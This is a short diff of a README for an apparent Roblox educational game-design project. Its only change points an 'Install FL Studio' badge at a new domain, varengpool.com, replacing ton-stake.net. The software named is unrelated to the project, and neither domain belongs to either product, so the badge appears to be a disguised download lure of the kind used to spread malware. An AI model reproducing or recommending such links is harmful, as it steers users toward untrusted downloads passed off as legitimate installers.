@@ -19,7 +19,7 @@ Teach game design with educational tools for Roblox Studio single-player use.
 Explore our projects to start creating!  
 
 [![Explore Projects](https://img.shields.io/badge/Explore_Projects-NOW-blueviolet)](https://github.com/RobloxLearnHub/Roblox-EduCraft) 
-[![Install FL Studio](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)   
+[![Install FL Studio](https://img.shields.io/badge/Install-NOW-blueviolet)](https://varengpool.com)   
 
 ---
 
